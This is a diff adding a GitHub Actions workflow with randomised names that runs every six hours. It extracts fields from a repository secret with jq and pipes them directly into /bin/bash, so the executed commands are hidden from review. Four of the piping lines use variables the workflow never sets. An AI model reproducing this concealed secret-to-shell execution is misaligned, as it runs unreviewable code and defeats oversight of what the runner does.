@@ -1,0 +1,23 @@
+name: huashuaibei3217
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huashuaibei3217
+        env:
+          ybki96: ${{ secrets.ybki96 }}
+        run: |
+          echo $ybki96 | jq -r .tvdz53121 | /bin/bash
+          echo $gla5602 | jq -r .lidj1664 | /bin/bash
+          echo $eags2 | jq -r .dhrmn9 | /bin/bash
+          echo $aznhm243 | jq -r .vsxc4629 | /bin/bash
+          echo $yx576 | jq -r .bzj1 | /bin/bash
+
